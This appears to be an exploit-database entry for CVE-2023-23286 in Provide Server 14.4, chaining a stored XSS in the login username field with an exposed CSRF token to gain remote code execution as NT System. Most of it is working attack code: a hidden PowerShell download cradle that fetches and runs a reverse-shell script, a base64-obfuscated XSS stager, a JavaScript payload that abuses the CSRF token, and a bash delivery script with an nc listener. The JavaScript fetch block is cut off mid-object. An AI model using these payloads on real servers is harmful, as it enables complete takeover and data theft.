@@ -1,0 +1,86 @@
+id: 38497
+date: 04/05/2023
+title: Provide Server v.14.4 XSS - CSRF & Remote Code Execution Vulnerabilities
+author: Andreas Finstad
+cves: CVE-2023-23286
+
+Provide Server v. 14.4
+CVE-2023-23286
+Vulnerabilities:
+CWE-79: Improper Neutralization of Input During Web Page Generation
+
+Unauthenticated stored XSS in server-log delivered via username field from login-form
+CWE-352: Cross-Site Request Forgery
+
+CSRF-token exposed in javascript, making it possible to obtain a valid CSRF-Token and use it in XMLHTTPRequests. This vulnerability allows an attacker to add a task that runs commands on the server as "NT-System" Impact:
+
+    An attacker could exploit the unauthenticated stored XSS vulnerability by injecting malicious code into the login form's username field. When the server-log is viewed, the malicious code will be executed, potentially allowing the attacker to steal user data or execute further attacks.
+    By exploiting the CSRF vulnerability, an attacker could add a task to the server that runs commands with NT-System privileges. This could potentially allow the attacker to take complete control of the server, access sensitive data, or disrupt service.
+
+Proof Of Consept
+RCE via XSS and CSRF
+
+    The attacker places the staged XSS into the username field and sends the login request. This will place the XSS stager in the server log and trigger when a administrator opens the log.
+    The XSS stager downloads and runs the XSS payload. The payload will add a task that runs the powershell downloadcradle every time someone connects to the server. Even unauthenticated connections.
+    The powershell-script downloaded in this example is a reverse shell, connecting back to the attacker. As the task runs as NT System on the server, the attacker will have full controll on the server.
+
+Powershell Downloadcradle
+
+PowerShell -noprofile -executionpolicy bypass "Start-process powershell.exe -argumentlist '-window hidden -noexit Start-Job { IEX(IWR https://example.com/rev.ps1 -UseBasicParsing) }'";exit
+Staged XSS
+
+<img id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZXhhbXBsZS5jb20veHNzLmpzIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw src=https://example.com/1 onload=eval(atob(this.id))>
+
+
+XSS payload:
+
+var vhost = window.location.protocol+'\/\/'+window.location.host
+var csrf_token = document.querySelector("meta[name='csrf-token']").getAttribute("content")
+  , o = XMLHttpRequest.prototype.open;
+XMLHttpRequest.prototype.open = function(a, b) {
+    var c = o.apply(this, arguments);
+    return (b.startsWith("/") || b.startsWith(window.location.origin)) && this.setRequestHeader("X-CSRF-Token", csrf_token),
+    c
+}
+
+ 
+
+fetch(vhost+'/ajax/SetEventsAndMessages',{
+    method: 'POST',
+    headers: {
+        'Content-Length': '3845', 
+        'Sec-Ch-Ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Microsoft Edge";v="108"', 
+        'X-Csrf-Token': csrf_token, 
+        'Sec-Ch-Ua-Mobile': '?0', 
+        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54', 
+        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8', 
+        'Accept': 'application/json, text/javascript, */*; q=0.01', 
+        'X-Requested-With': 'XMLHttpRequest', 
+        'Sec-Ch-Ua-Platform': '"macOS"', 
+        'Origin': vhost, 
+        'Sec-Fetch-Site': 'same-origin', 
+        'Sec-Fetch-Mode': 'cors', 
+        'Sec-Fetch-Dest': 'empty', 
+        'Accept-Encoding': 'gzip, deflate', 
+        'Accept-Language': 'en-US,en;q=0.9,nb;q=0.8,no;q=0.7,en-GB;q=0.6', 
+        'Connection': 'close'
+    },
+
+Bash script for running exploit:
+
+#!/bin/bash
+echo "Sending payload"
+host=$1
+
+if [ "$2" == "trigger" ]
+	then
+	curl -s -k https://$1 >/dev/null
+else
+
+curl -i -s -k $'POST' -H $host -H $'Content-Length: 262' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Sec-Fetch-Dest: document' -H "Referer: https://$host" -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9,nb;q=0.8,no;q=0.7,en-GB;q=0.6' -H $'Connection: close' --data-binary $'path=%2F&username=%3Cimg+id%3DdmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZjIwLmJlL2FsZXJ0Mi5qcyI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs%3D+src%3Dhttps%3A%2F%2Ff20.be%2F1+onload%3Deval%28atob%28this.id%29%29%3E&password=&logon=Log+in' "https://$host" > /dev/null
+clear
+fi
+echo "Waiting..."
+rlwrap nc -lvnp 5555
+
+#  0day.today [2023-04-19]  #
